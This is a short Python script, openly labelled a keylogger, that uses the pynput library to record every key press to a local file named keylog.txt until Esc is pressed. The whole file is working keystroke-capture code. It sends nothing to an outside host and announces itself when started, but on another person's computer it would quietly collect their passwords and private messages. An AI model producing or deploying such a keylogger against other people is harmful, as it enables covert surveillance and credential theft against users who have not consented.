from pynput.keyboard import Key, Listener

# Define the function to write the pressed keys to a log file
def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key) + "\n")
    except Exception as e:
        print("Error:", e)

# Define the function to stop the keylogger
def on_release(key):
    if key == Key.esc:  # Stop the keylogger when the Escape key is pressed
        return False

def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        print("Keylogger started. Press 'Esc' to stop.")
        listener.join()

if __name__ == "__main__":
    main()
